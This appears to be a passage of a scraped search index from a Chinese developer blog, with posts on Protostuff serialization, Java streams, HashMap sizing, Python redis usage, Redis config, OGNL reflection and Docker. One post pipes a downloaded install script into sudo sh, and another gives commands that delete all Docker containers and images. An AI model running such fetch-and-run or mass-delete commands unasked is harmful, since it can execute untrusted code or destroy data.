= ProtostuffIOUtil.toByteArray(b, schema, buffer); } finally { buffer.clear(); } Schema&lt;NDO&gt; nSchema = RuntimeSchema.getSchema(NDO.class); NDO ndo = nSchema.newMessage(); ProtostuffIOUtil.mergeFrom(protostuff, ndo, nSchema); System.out.println(ndo);} 从下面的输出可以看到，反序列化不出来，在序列化的时候就已经丢掉了 接着我们再验证下NDO序列化的结果，因为没有Deprecated注解，反序列化为NDO对象时，应该是齐全的，那么反序列化为BDO呢 12345678910111213141516171819202122@Testpublic void testSer3() { NDO n = new NDO(\"10\", \"20\"); Schema&lt;NDO&gt; schema = RuntimeSchema.getSchema(NDO.class); LinkedBuffer buffer = LinkedBuffer.allocate(512); final byte[] protostuff; try { protostuff = ProtostuffIOUtil.toByteArray(n, schema, buffer); } finally { buffer.clear(); } NDO ans = schema.newMessage(); ProtostuffIOUtil.mergeFrom(protostuff, ans, schema); System.out.println(ans); Schema&lt;BDO&gt; bSchema = RuntimeSchema.getSchema(BDO.class); BDO bdo = bSchema.newMessage(); ProtostuffIOUtil.mergeFrom(protostuff, bdo, bSchema); System.out.println(bdo);} 从下面的输出可以看出，反序列化时，成员上有@Deprecated注解时，也无法获取正确的结果 3. 兼容方案查了下protostuf的相关文档，个人感觉它的设计理念就是认为加了这个删除注解，就没有必要继续存在了，就直接给忽略了。那么我希望加上了这个注解的可以被序列化/反序列化，有办法么？ 查看api的时候，发现在创建Schema的时候，有个方法io.protostuff.runtime.RuntimeSchema#createFrom(java.lang.Class&lt;T&gt;, java.util.Map&lt;java.lang.String,java.lang.String&gt;, io.protostuff.runtime.IdStrategy)， 可以指定成员列表 于是我们就有了一个猥琐的兼容方式 12345678910111213141516171819202122@Testpublic void testSer() { BDO b = new BDO(\"10\", \"20\"); Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(\"a\", \"a\"); map.put(\"b\", \"b\"); Schema&lt;BDO&gt; schema = RuntimeSchema.createFrom(BDO.class, map, RuntimeEnv.ID_STRATEGY); // Schema&lt;BDO&gt; schema = RuntimeSchema.createFrom(BDO.class, new String[]{}, RuntimeEnv.ID_STRATEGY); LinkedBuffer buffer = LinkedBuffer.allocate(512); final byte[] protostuff; try { protostuff = ProtostuffIOUtil.toByteArray(b, schema, buffer); } finally { buffer.clear(); } // deser BDO fooParsed = schema.newMessage(); ProtostuffIOUtil.mergeFrom(protostuff, fooParsed, schema); System.out.println(fooParsed);} 测试结果如下，反序列化的实例中有相应的数据了 4. 小结遵循ProtoStuff的使用规范，如果一个成员上有注解@Deprecated，那么这个成员的数据将不会被序列化和反序列化 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/08/21/190821-ProtoStuff无法反序列化Deprecated注解成员问题记录/"},{"title":"191107-InputStream重复使用小技巧","text":"在日常的编码中，有时会遇到，需要重复获取InputStream中的数据的需求；然后一般的流，只能读一次，读完就没了；那么如果我希望有一个可以重复读取数据的InputStream，可以怎么操作？ 12345678910111213141516171819202122232425/** * 转换为字节数组输入流，可以重复消费流中数据 * * @param inputStream * @return * @throws IOException */public static ByteArrayInputStream toByteArrayInputStream(InputStream inputStream) throws IOException { if (inputStream instanceof ByteArrayInputStream) { return (ByteArrayInputStream) inputStream; } try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) { BufferedInputStream br = new BufferedInputStream(inputStream); byte[] b = new byte[1024]; for (int c; (c = br.read(b)) != -1; ) { bos.write(b, 0, c); } // 主动告知回收 b = null; br.close(); inputStream.close(); return new ByteArrayInputStream(bos.toByteArray()); }} 实现方式基本就是将InputStream中的数据读取，写入到一个临时的输出流，然后再封装为ByteArrayInputStream即可 当我们使用时，如果需要重复消费流中数据，手动调用java.io.ByteArrayInputStream#reset II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/07/191107-InputStream重复使用小技巧/"},{"title":"190920-ProtoStuff不支持BigDecimal序列化/反序列化记录","text":"平时使用ProtoStuff作为序列化工具，对于一些POJO对象序列化，但是在实际使用中，发现针对BigDecimal对象进行序列化时却出现了问题 不管什么数，生成的byte数组都一样 无法正确反序列化 下面记录一下这个问题 1. 场景复现我们使用的protostuff依赖如下 12345678910 &lt;dependency&gt; &lt;groupId&gt;com.dyuproject.protostuff&lt;/groupId&gt; &lt;artifactId&gt;protostuff-core&lt;/artifactId&gt; &lt;version&gt;1.1.3&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.dyuproject.protostuff&lt;/groupId&gt; &lt;artifactId&gt;protostuff-runtime&lt;/artifactId&gt; &lt;version&gt;1.1.3&lt;/version&gt;&lt;/dependency&gt; 写一个简单测试demo，如下 123456789101112131415161718192021222324252627282930313233343536373839public static byte[] serialize(Object obj) { Schema schema = RuntimeSchema.getSchema(obj.getClass()); LinkedBuffer buffer = LinkedBuffer.allocate(1048576); byte[] protoStuff; try { protoStuff = ProtostuffIOUtil.toByteArray(obj, schema, buffer); } catch (Exception var8) { throw new RuntimeException(\"Failed to serializer\"); } finally { buffer.clear(); } return protoStuff;}public static &lt;T&gt; T deserialize(byte[] paramArrayOfByte, Class&lt;T&gt; targetClass) { if (paramArrayOfByte != null &amp;&amp; paramArrayOfByte.length != 0) { Schema&lt;T&gt; schema = RuntimeSchema.getSchema(targetClass); T instance = schema.newMessage(); ProtostuffIOUtil.mergeFrom(paramArrayOfByte, instance, schema); return instance; } else { throw new RuntimeException(\"Failed to deserialize\"); }}@Testpublic void testSer() { byte[] ans = serialize(new BigDecimal(20)); byte[] ans2 = serialize(new BigDecimal(120)); System.out.println(new String(ans)); System.out.println(new String(ans2)); BigDecimal res = deserialize(ans, BigDecimal.class); System.out.println(res);} 执行如下 2. 疑似原因与兼容方法并没有找到具体的原因，在github上有一个issure: https://github.com/protostuff/protostuff/issues/245，其中回复为 Protostuff works on user-defined types (pojos), not on built-in jdk types. 上面的说法是ProtoStuff更多的是用于简单对象的序列化，而不是基础的jdk类型，因此推荐的是序列一个成员变量为BigDecimal的对象 接下来我们试一下，定义一个简单的对象，成员为BigDecimal的场景 1234567891011121314151617181920212223@Datapublic static class InnerDecimal { private BigDecimal decimal; public InnerDecimal() { } public InnerDecimal(BigDecimal decimal) { this.decimal = decimal; }}@Testpublic void testSer() { byte[] ans = serialize(new InnerDecimal(new BigDecimal(20.123))); byte[] ans2 = serialize(new InnerDecimal(new BigDecimal(120.1970824))); System.out.println(new String(ans)); System.out.println(new String(ans2)); InnerDecimal res = deserialize(ans, InnerDecimal.class); System.out.println(res);} 测试输出如下 上面虽然可以正常工作，但与我们希望的差别有点大，序列化一个BigDecimal，还需要定义一个POJO包装他，有点麻烦；于是一个猥琐的方法就是在序列化和反序列化的时候，针对BigDeimal进行特殊处理 1234567891011121314151617181920212223242526272829303132333435363738public static byte[] serialize(Object obj) { if (obj instanceof BigDecimal) { obj = ((BigDecimal) obj).toPlainString(); } Schema schema = RuntimeSchema.getSchema(obj.getClass()); LinkedBuffer buffer = LinkedBuffer.allocate(1048576); byte[] protoStuff; try { protoStuff = ProtostuffIOUtil.toByteArray(obj, schema, buffer); } catch (Exception var8) { throw new RuntimeException(\"Failed to serializer\"); } finally { buffer.clear(); } return protoStuff;}public static &lt;T&gt; T deserialize(byte[] paramArrayOfByte, Class&lt;T&gt; targetClass) { if (paramArrayOfByte != null &amp;&amp; paramArrayOfByte.length != 0) { Schema schema; if (targetClass.isAssignableFrom(BigDecimal.class)) { schema = RuntimeSchema.getSchema(String.class); Object instance = schema.newMessage(); ProtostuffIOUtil.mergeFrom(paramArrayOfByte, instance, schema); return (T) new BigDecimal((String) instance); } else { schema = RuntimeSchema.getSchema(targetClass); Object instance = schema.newMessage(); ProtostuffIOUtil.mergeFrom(paramArrayOfByte, instance, schema); return (T) instance; } } else { throw new RuntimeException(\"Failed to deserialize\"); }} 再次测试，正常执行 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/09/20/190920-ProtoStuff不支持BigDecimal序列化-反序列化记录/"},{"title":"191206-Centos安装docker与使用说明","text":"本文主要介绍Centos下如何安装docker，并给出一些基本的使用case 1. 安装说明通过脚本进行docker安装，比较简单 12curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh 执行完毕之后，启动docker 1sudo systemctl start docker 然后开始验证是否可以使用 123sudo docker run hello-world# 查看所有的容器docker ps -a 如果安装正确，如下 2. 使用相关1. 安装centos镜像在docker中安装一个centos的镜像，然后在docker中的centos里面搞事情 安装命令: docker pull 镜像名:版本 12# 安装镜像docker pull centos 在安装之前，如果我们不确定有哪些镜像，可以怎么办？可以简单的搜索一下 12# docker hub上查找centos的镜像docker search centos 然后从上面的搜索结果中，挑选合适的镜像进行下载，然后可以查看本地镜像列表 123456# 查看本地镜像# docker images -a # 查看本地所有镜像docker images centosREPOSITORY TAG IMAGE ID CREATED SIZEcentos 7.4.1708 295a0b2bd8ea 8 weeks ago 197MB 2. 容器使用这一小节，主要目的就是如何加载一个镜像，启动，关闭，删除容器等操作 加载镜像 主要就是run方式运行容器, 下面启动一个可交互的centos容器 1docker run -it centos 上面执行完毕之后，会进入容器内的centos，通过 exit退出 查看容器 查看docker当前加载的容器列表 1docker ps -a 执行之后，可以看到刚才的centos对应的容器，状态为突出 12CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9e0c9c3a6545 centos \"/bin/bash\" 8 seconds ago Exited (0) 5 seconds ago nifty_elgamal 那么我们能再次进入这个容器么？ 启动容器 想进入上面这个容器，首先得让它跑起来,通过start命令 12# 注意后面的那串文本，为CONTAINER IDdocker start 9e0c9c3a6545 进入容器 通过 docker exec 方式进入容器，之前看到一个博文，说是有四种进入方式，这里选择exec方式进入 原文：Docker容器进入的4种方式 1docker exec -it 9e0c9c3a6545 /bin/bash 上面执行完毕之后，会发现又一次进入了容器内的centos系统 到这里就会有个疑问 我在这个容器里面的修改是否会保留下来，我下次进来的时候，是不是这些东西还有没有 每次退出之后，容器都会停止运行么？ 针对上面的两个疑问，实际的操作一下，结果如下图 容器内的修改会保留 exit退出之后，容器并不会停止，依然是运行的状态 停止容器 如果想要关闭容器，也比较简单 1docker stop 9e0c9c3a6545 删除容器 1docker rm 9e0c9c3a6545 3. 定制镜像以交互式运行centos镜像 1docker run -it centos 然后就进入了docker中的centos操作系统了，然后可以在里面部署基本的环境，先做一个简单的演示，在home文件夹下初始化几个目录 12345cd /home/mkdir yihui data soft# 退出容器exit 执行过程如下 退出容器之后，将上面我们的修改保存 123docker commit 47476c86c510 yihui/centos# 查看本地的所有镜像，会多一个 yihui/centosdocker images -a 我们改的docker实际上是在原始docker的基础上改进而来，可以通过下面的命令查看演进过程 1docker history 240840e65297 接下来就是如何使用我们修改后的镜像了，首先是加载自定义的容器, 然后一番操作如下 12345# 加载镜像docker run -d -it yihui/centos# 进入容器docker ps -adocker exec -it 0e118346222c /bin/bash 保存后的镜像，还可以修改tag，命令如下 1docker tag xxx yihui/centos:v2 III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/12/06/191206-Centos安装docker与使用说明/"},{"title":"191206-Docker 常用命令速查手册","text":"记录一下docker的日常使用命令，本文主要针对linux + mac操作系统而言，window是否适用不太确定，谨慎使用 1. docker进程docker进程启动、停止、重启，常见的三种case 123456# 启动dockerservice docker start# 关机dockerservice docker stop# 重启dockerservice docker restart 2. 镜像操作镜像作为容器执行的前提条件，一般需要掌握的几个命令无非是搜索，下载，删除，创建 12345678# 镜像列表docker images# 检索镜像, 从镜像仓库中检索docker search xxx# 下载镜像docker pull xxx# 删除镜像docker rmi xxx 关于创建镜像，有必要稍微详细一点点 1234# 通过容器创建镜像docker commit -m=\"首次提交\" -a=\"一灰灰Blog\" dd85eb055fe8 yh/centos:v0.1# 镜像历史查询docker history yh/centos 上面的几个参数进行说明 -m 和git的提交一样，后面跟上描述信息 -a 版权声明，这个东西简单来讲就是宣示主权，这个镜像我承包了… dd85eb055fe8 容器id yhh/quick-os:0.1 创建的镜像名 3. 容器操作接下来就是正菜了，容器的各种操作，启动，关闭，重启，日志查询以及各种进入容器内部搞事情 a. run万事开头第一步，加载镜像，创建容器 1docker run 镜像名:版本 run后面可以跟很多的参数，比如容器暴露端口指定，存储映射，权限等等，由于参数过多，下面只给出几个不同的例子，来具体的演示参数可以怎么加 case1: 创建并后台执行 1docker run -i -t -d centos:latest 其中关键参数为-d，指定容器运行与前台或者后台，不加上时前台 -i: 打开STDIN，用于控制台交互 -t: 支持终端登录 case2: 运行一个带命令在后台不断执行的容器 1docker run -d centos:latest ping www.baidu.com case3: 运行一个在后台不断执行的容器，同时带有命令，程序被终止后还能重启继续跑 1docker run -d --restart=always centos:latest ping www.baidu.com case4: 指定容器名 1docker run -d --name=yhh_centos centos:latest case5: 暴露容器端口80，并与宿主机端口8080绑定 1docker run -d --name=yhh_centos -p 8080:80 centos:latest case6: 指定容器与宿主机目录（/home/yihui/html/www）共享 1docker run -d --name=yhh_centos -v /home/yihui/html/www:/var/www centos:latest b. 基操容器创建完毕之后，就是一些基本操作了，启动、停止、重启、删除 12345678910# 查看容器列表， 列出所有的容器docker ps -a # 启动容器，start后面可以跟上容器名，或者容器iddocker start xxx # (这里的xxx可以是容器名：yhh_centos 也可以是容器id：f57398ab22c5)# 关闭容器docker stop xxx# 重启docker restart xxx# 删除docker rm xxx 在查看容器列表时，如果某个容器的启动参数特别长，直接使用docker ps -a会发现看不到完整的启动命令，这个时候可以带上参数--no-trunc来显示完整命令 1docker ps -a --no-trunc c. 进阶接下来进入一些容器的高级操作技巧（实际上也并没有特别酷炫） 为了演示一些进阶的内容，这里创建一个容器作为测试 1docker run -it -d --name=yhhos centos 容器日志查询 日志，定位问题的神器 12# 查询xxx容器的日志docker logs yhhos 基本上不太会直接使用上面的命令，因为上面把所有的日志都打印出来了，可以直接晃瞎我们的钛合金x眼 一般日志可以加两个参数 -f, -t 1docker logs -f -t --since=\"2019-05-11\" --tail=10 yhhos --since : 此参数指定了输出日志开始日期，即只输出指定日期之后的日志。 -f : 查看实时日志 -t : 查看日志产生的日期 --tail=10 : 查看最后的10条日志。 文件拷贝 将容器的某个文件捞出来；或者强塞，一个cp即可 12345# 将当前目录的test.md文件拷贝到容器的 /tmp 目录下docker cp test.md yhhos:/tmp# 将容器的/tmp/test.md目录拷贝到当前目录下docker cp yhhos:/tmp/test.md ./out.md 进入容器 进入容器内部，然后就可以为所欲为了… 1docker exec -it yhhos /bin/bash 获取容器所有信息 1docker inspect yhhos II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/12/06/191206-Docker-常用命令速查手册/"},{"title":"200109-Python redis使用手册上篇","text":"本文可作为redis的操作指南，介绍redis命令对应的python使用姿势 0. 准备篇首先需要一个redis环境，安装过程，可以参考: redis-环境安装 其次python3 环境安装，可以参考博文：python 运行环境搭建 redis模块安装 1pip install redis 1. redis连接直接连接 123import redisconn = redis.Redis(host='127.0.0.1', port=6379, password='') 主要是三个参数，host + port + password 需要注意一点，当我们需要连接的redis不在本机时，请确保redis的配置是开启了外部访问的，否则会提示连接失败 连接池方式 连接池的方式最大的好处是每次需要获取连接时，从连接池中获得一个可用连接，用完之后不会立马释放，而是扔回到连接池，以实现连接的复用，避免频繁的redis连接的创建和释放 1234import redispool = redis.ConnectionPool(host='127.0.0.1', port=6379, password='')conn = redis.Redis(connection_pool=pool) 2. String首先介绍Redis基本数据结构中String的操作姿势 添加 1234567891011121314151617181920212223# name 为redis对应的key# value 为redis对应的value# ex 过期时间(s)# px 过期时间(ms)# nx true : 表示在key不存在时，set操作成功; false 时表示不管咋地都写入# xx true : 表示在key存在时，set操作才成功redis.client.Redis#set(name, value, ex=None, px=None, nx=False, xx=False)# 带失效时间的设置# name -&gt; redisKey# value -&gt; redisValue# time -&gt; 过期时间，sredis.client.Redis#setex(name, time, value)# 带失效时间的设置，与上面的区别在于参数的时间为msredis.client.Redis#psetex(name, time_ms, value)# key不存在时，才写入redis.client.Redis#setnx(name, value)# 批量写入，传入字典redis.client.Redis#mset(dict) 获取 注意下面获取的结果类型为byte，使用的时候需要转换成目标对象 12345# 获取数据redis.client.Redis#get(name)# 批量获取数据，注意返回列表，与传入的keys根据数组的下标进行对应；如果某个key不存在，返回Noneredis.client.Redis#mget(keys) 实例 1234567891011121314151617181920212223242526272829303132import timeimport redisconn = redis.Redis(host='127.0.0.1', port=6379, password='')def str_demo(): # 基本的写入 读取操作 ans = conn.set('test', 1234) print(ans) # 请注意返回的结果为byte类型 ans = conn.get('test') print(ans.decode('utf8')) # 不存在时，才写入成功，此时应该返回false ans = conn.setnx('test', 4567) print(f'{ans}==False') ans = conn.setex('test', 1, 'abc') ret = conn.get('test') time.sleep(1) ret2 = conn.get('test') print(f'{ans}|{ret}==abc|{ret2}==blank') conn.mset({'t1': 1, 't2': 2, 't3': 3, 't4': 4}) ans = conn.mget('t1', 't3', 't5', 't4', 't2') print(f\"mget: {ans}\")str_demo() 输出结果 12345True1234False==FalseTrue|b&apos;abc&apos;==abc|None==blankmget: [b&apos;1&apos;, b&apos;3&apos;, None, b&apos;4&apos;, b&apos;2&apos;] 请注意一下上面的mget返回结果，与传入的keys是通过数组小标进行关联的 3. List数据结构为列表，支持左添加，右添加 添加 12345678910111213141516# 在列表左边添加数据，value可以是多个，最右边的参数，在最终列表的最左边lpush(key, v1, v2...)# 在列表的右边添加数据，value可以有多个，最右边的参数，在最终列表的最右边rpush(key, v1, v2...)# 在列表的最左边，添加一个数据lpushex(key, value)# 在列表的最右边，添加一个数据rpushex(key, value)# 修改列表中index索引的值，替换为 newValuelset(key, index, newValue)# 查找 originValue, 在它的左边/右边（由where参数决定）插入一个 newValuelinsert(key, where, originValue, newValue) 获取 12345# 获取某个位置的元素lindex(key, index)# 获取索引为 start -&gt; end 的所有值，end为-1时，表示最右边一个lrange(key, start, end) 删除 123456# 删除最左边的lpop(key)# 删除指定的value，如果num为0，表示删除所有的value；如果大于0，表示从左到右删除num个；小于从右到做删除num个lrem(key, value, num)# 移除不再索引内的所有值ltrim(key, start, end) 实例 12345678910111213141516171819202122232425262728293031def list_demo(): key = \"l_test\" conn.delete(key) # 批量添加，3在最右边，返回列表长度 conn.lpush(key, 1, 2, 3) ans = conn.lpushx(key, 'head') print(ans) conn.rpush(key, 'a', 'b') conn.rpushx(key, 'tail') ans = conn.lrange(key, 0, -1) print(ans) # 更新索引为2的值 conn.lset(key, 2, 'update') conn.linsert(key, 'after', 'update', 'insert') ans = conn.lrange(key, 0, -1) print(ans) # 返回并删除最左边的元素 ans = conn.lpop(key) print(f\"{ans}==head\") # 保留索引在闭区间[1,3]的元素 conn.ltrim(key, 1, 3) ans = conn.lrange(key, 0, -1) print(ans)list_demo() 输出结果 123454[b&apos;head&apos;, b&apos;3&apos;, b&apos;2&apos;, b&apos;1&apos;, b&apos;a&apos;, b&apos;b&apos;, b&apos;tail&apos;][b&apos;head&apos;, b&apos;3&apos;, b&apos;update&apos;, b&apos;insert&apos;, b&apos;1&apos;, b&apos;a&apos;, b&apos;b&apos;, b&apos;tail&apos;]b&apos;head&apos;==head[b&apos;update&apos;, b&apos;insert&apos;, b&apos;1&apos;] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/01/09/200109-Python-redis使用手册上篇/"},{"title":"200111-老哥，你真的知道HashMap初始化大小如何设置么","text":"HashMap对于javer而言，可以说是非常非常熟悉的一个容器类了，可以说99.99%的java开发者都用过它，那么你知道怎样创建一个HashMap是最优雅的方式呢？ I. HashMap初始化大小的推荐姿势1. 基本知识点在指明正确的使用姿势之前，有必要先了解一下HashMap的基础知识；本文重点不会放在源码分析，所以直接给一些必要的知识点 数据结构 HashMap的数据存储结构，在jdk1.7中，属于标准的 数组+链表; 在jdk1.8中，为数组 + 链表/红黑树 这里不关注1.8中链表-&gt;红黑树的转换，简单说一下存储逻辑 根据key计算hash值，针对数组长度取余得到这对kv在数组中的下标 因为hash碰撞问题，不同的key，对应的数组下标可能一致，所以数组中存的内容按列表/红黑树方式串联在一起 数组大小 在HashMap中的，数组的大小为2^n 扩容机制 HashMap默认采用了预扩容机制，简单来讲就是虽然实际存的数据量还没有达到数组的长度，就会提前扩容为原来的两倍(如果是单个加入时，扩容两倍；如果是批量加入时，可能为2^n倍) 2. 一般使用初始化姿势首先来看一下一般的HashMap使用姿势 12Map&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put(xxx, xxx); 上面这种使用方式从语法上来看，并没有什么问题；但实际情况呢? 假如我们可以确定，我们需要往map中添加的数据量有1024个，使用上面的方式，会出现(16 -&gt; 32 -&gt; 64 -&gt; 128 -&gt; 256 -&gt; 512 -&gt; 1024 -&gt; 2048=8)次的扩容，而扩容就会导致创建新的数组，数据拷贝。而如果我们在初始化的时候，直接指定大小为2048，那么就不会出现扩容了 为了验证1024个元素，扩容的次数，写一个简单的demo测试一下 1234567891011121314151617181920@Testpublic void testMap2() throws NoSuchFieldException, IllegalAccessException { Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); Field field = map.getClass().getDeclaredField(\"table\"); field.setAccessible(true); int lastLen = 0; int nowLen = 0; for (int index = 0; index &lt;= 1024; index++) { map.put(index, index); nowLen = ((Object[]) field.get(map)).length; if (lastLen == 0) { lastLen = nowLen; continue; } if (nowLen != lastLen) { System.out.println(String.format(\"resize from %d -&gt; %d, index: %d\", lastLen, nowLen, index)); } lastLen = nowLen; }} 执行上面的case，输出结果如下 (请注意，实例化HashMap对象时，并不会创建数组，只有在首次添加数据时才会创建数组) 1234567resize from 16 -&gt; 32, index: 12resize from 32 -&gt; 64, index: 24resize from 64 -&gt; 128, index: 48resize from 128 -&gt; 256, index: 96resize from 256 -&gt; 512, index: 192resize from 512 -&gt; 1024, index: 384resize from 1024 -&gt; 2048, index: 768 如果将我们的map长度设置为2048，那么就不会有一次的扩容，上面的日志将不存在 那么我们应该如何确定Map的初始化大小呢？ 3. 推荐初始化姿势仔细看一下上面的输出，结合第一节的内容，HashMap的扩容，并不是在达到数组的长度时，实现的扩容，比如在添加第13个元素时(从1开始计数），实现了16 -&gt; 32的扩容 看过HashMap源码的同学会知道，决定上面扩容阈值的主要来自于loadFactor这个参数，可以在初始化的时候指定，当然不太建议修改 默认的case下，loadFactor == 0.75，也就是说当map的数据量超过数组长度的3/4（size &gt; len ** 0.75）时，就会扩容 所以，在初始化HashMap时，特别是当你能预估map中数据量的大小为len时，请初始化时，指定大小 size=2^n * 0.75 &gt; len的最小值 1HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;(size); 举几个实例 map数量为2时，初始化大小为4 map数量为12时，初始化大小为16 (因为初始化为16时，扩容的阈值为12，正好没有超过阈值) map数量为13时，初始化大小为32 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/01/11/200111-老哥，你真的知道HashMap初始化大小如何设置么/"},{"title":"200115-Redis配置参数在线修改（热修改）","text":"redis的配置除了直接修改配置文件之后，重启进程之外，还支持在线修改，下面记录一下使用姿势 我们主要通过config命令来查询和修改配置，如获取所有配置 12# 获取所有的配置config get * 下面以一个具体的实例来进行说明，我们知道redis的默认保存策略是RDB方式，通过save参数配置保存规则 1config get save 默认输出结果如下 121) &quot;save&quot;2) &quot;900 1 300 10 60 10000&quot; 第一行返回的是配置名 第二行返回的是配置信息，对应配置文件中的 123save 900 1 #在900秒(15分钟)之后，如果至少有1个key发生变化，则dump内存快照。save 300 10 #在300秒(5分钟)之后，如果至少有10个key发生变化，则dump内存快照。save 60 10000 #在60秒(1分钟)之后，如果至少有10000个key发生变化，则dump内存快照。 我们可以修改一下，将60s的策略扔掉，如下 12345127.0.0.1:6379&gt; config set save \"900 1 300 10\"OK127.0.0.1:6379&gt; config get save1) \"save\"2) \"900 1 300 10\" II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/01/15/200115-Redis配置参数在线修改（热修改）/"},{"title":"200223-docker 批量删除命令小记","text":"删除所有容器 1docker rm `docker ps -a -q` 删除所有镜像 1docker rmi `docker images -q` 删除没有tag镜像 1docker rmi `docker images|grep none|awk '{print $3 }'|xargs` 删除指定的镜像 12# 删除包含 pt- 的镜像docker rmi -f `docker images | grep pt-*| awk '{print $3}'` 原文： Docker 批量删除images II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/23/200223-docker-批量删除命令小记/"},{"title":"191217-Ognl之内部类与静态成员属性修改使用姿势","text":"在191204-Ognl 使用实例手册 中，当时遇到一个问题，静态成员属性直接赋值时，会抛出异常；那么这个问题真的无解么？ 此外之前的实例手册中，漏了一个内部类的使用姿势，本文也一并补上 1. 内部类使用我们这里指定的内部类通常是静态内部类，但是直接像一般的静态类的调用方式会发现找不到类，这个时候需要借助$，如下 12# 注意外部类与内部类之间使用$进行分割@git.hui.fix.test.ognl.OgnlTest$InnerClz@age 一个简单的测试case 12345678910111213141516171819package git.hui.fix.test.ognl;public class OgnlTest { public static class InnerClz { public static Integer age = 10; } @Test public void test() { // 构建一个OgnlContext对象 OgnlContext context = (OgnlContext) Ognl.createDefaultContext(this, new DefaultMemberAccess(true), new DefaultClassResolver(), new DefaultTypeConverter()); // 静态类成员修改 ans = Ognl.getValue(Ognl.parseExpression(\"@git.hui.fix.test.ognl.OgnlTest$InnerClz@age\"), context, context.getRoot()); System.out.println(\"静态成员: \" + ans); }} 2. 静态成员修改直接使用静态赋值，会抛异常，那么静态成员可以怎么修改呢？ 走曲线救国套路，利用反射的方式来处理，比如下面的case 12# 通过反射的方式修改静态成员@git.hui.fix.test.ognl.OgnlTest$InnerClz@class.getField(\"age\").set(null, 30) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/12/17/191217-Ognl之内部类与静态成员属性修改使用姿势/"},{"title":"200303-如何优雅的在java中统计代码块耗时","text":"在我们的实际开发中，多多少少会遇到统计一段代码片段的耗时的情况，我们一般的写法如下 123456long start = System.currentTimeMillis();try { // .... 具体的代码段} finally { System.out.println(\"cost: \" + (System.currentTimeMillis() - start));} 上面的写法没有什么毛病，但是看起来就不太美观了，那么有没有什么更优雅的写法呢？ 1. 代理方式了解Spring AOP的同学可能立马会想到一个解决方法，如果想要统计某个方法耗时，使用切面可以无侵入的实现，如 1234567891011121314// 定义切点，拦截所有满足条件的方法@Pointcut(\"execution(public * com.git.hui.boot.aop.demo.*.*(*))\")public void point() {}@Around(\"point()\")public Object 